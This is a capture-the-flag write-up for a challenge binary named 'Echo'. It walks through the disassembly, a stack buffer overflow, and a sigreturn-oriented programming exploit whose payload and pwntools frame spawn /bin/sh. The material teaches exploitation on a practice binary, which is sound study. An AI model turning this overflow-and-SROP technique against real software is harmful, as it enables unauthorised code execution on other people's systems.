## Echo 
We are given a small binary that echos what you write to it using syscalls

The echo function:
```asm 
<+0>:     push   rbp
<+1>:     mov    rbp,rsp
<+4>:     sub    rsp,0x300
<+11>:    mov    eax,0x0
<+16>:    mov    edi,0x0
<+21>:    lea    rsi,[rsp+0x180]
<+29>:    mov    edx,0x300
<+34>:    syscall
<+36>:    mov    rdx,rax
<+39>:    mov    eax,0x1
<+44>:    mov    edi,0x1
<+49>:    syscall
<+51>:    leave
<+52>:    ret
```
In addition, the author was kind enough to include a ```/bin/sh``` in the code segment
```
0x401035 <echo+53>:     "/bin/sh"
```
### Syscall convention
Quick reminder for x86_64 syscall calling convetions, parameters are passed via ```rdi, rsi, rdx, r10, r8, r9```
and ```rax``` is used to select the syscall.
For pwning the challenge, we will use the read (```rax = 0```) and sigreturn (```rax = 0xf```) syscalls.
### The vulnerability(ies)
1. There is a very obvious buffer overflow, the read syscall will overflow the stack
since we are reading ```rdx = 0x300``` bytes into ```rsi = rsp - 0x180``` resulting in 0x180 bytes of overflow.

2. Every binary with that uses ```syscall``` should raise your eyebrow, especially because of syscall 0x3b (```exceve```),
and the syscall 0xf ```sigreturn```.


### First attempt at pwning the challenge
If we can read 0x3b bytes, and at the same time load ```rdi``` with ```/bin/sh``` and return to a syscall -
we will get shell (since read return the number of bytes read, and will load ```rax = 0x3b```).
however after few attempts I couldn't find a straight forward way of doing it.


### Actually pwning this binary:
As I mentioned before we will be using srop to solve this challenge.
The solution splits into two phases:
### 1. Loading the srop frame into the memory:
On the first call of echo, we will prepare the stack by writing the following payload:
```0x188*b"A" + p64(elf.sym.echo) + p64(0x40101d) + bytes(frame)```
The first 0x188 bytes are there to overflow the return address with ```echo``` function address.
When the next call of ```echo``` will return, it'll return to ```0x40101d```.
```asm
0x000000000040101d <+29>:    mov    edx,0x300
0x0000000000401022 <+34>:    syscall
```
By the point we are at ```0x40101d``` we'll have ```frame``` at the top of the stack.


The idea is, that if we can have ```rax = 0xf``` and call syscall, while having an srop frame 
one the stack, we can basically do anything.
However, this phase only loads everything on the stack, we are still missing ```rax = 0xf```


### 2. Loading ```rax = 0xf```:
The reason we return to ```echo``` a second time, is just to write 15 bytes, and by that set ```rax = 0xf```


### 3. What's in the frame:
```python
frame = SigreturnFrame(kernel ="amd64")
frame.rax = 0x3b
frame.rdi = binsh
frame.rip = 0x401022
frame.rdx = 0
```
The frame loads all the registers with the appropriate values, and returns to a syscall.

Run it all, and get shell :)
